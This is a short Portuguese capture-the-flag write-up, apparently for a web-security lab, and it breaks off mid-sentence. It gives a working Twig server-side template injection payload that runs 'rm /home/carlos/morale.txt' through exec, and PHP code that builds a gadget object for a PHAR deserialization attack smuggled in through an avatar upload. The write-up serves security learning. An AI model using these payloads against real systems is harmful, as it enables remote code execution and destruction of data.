#ctf 

Ao fazer o upload de uma imagem, o link para acessar ela é `/cgi-bin/avatar.php?avatar=wiener`. O diretório `cgi-bin` guarda scripts CGI (Common Gateway Interface) que são programas executáveis que ajudam a fornecer conteúdo dinâmico.

Através deste diretório é possível acessar dois scripts: `CustomTemplate.php` e `Blog.php`.

No código de `Blog.php` é usado um template engine (Twig) que é possível usar um payload de **server-side template injection** para executar um código remoto.

```PHP
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

Criando um código malicioso:

```PHP
class CustomTemplate {} 
class Blog {} 
$object = new CustomTemplate; 
$blog = new Blog; 
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'; 
$blog->user = 'user'; 
$object->template_file_path = $blog;
```

Para enviar esse arquivo, é utilizado a funcionalidade de upload de avatar, porém, ela só aceita arquivos JPG. Para burlar e enviar um PHAR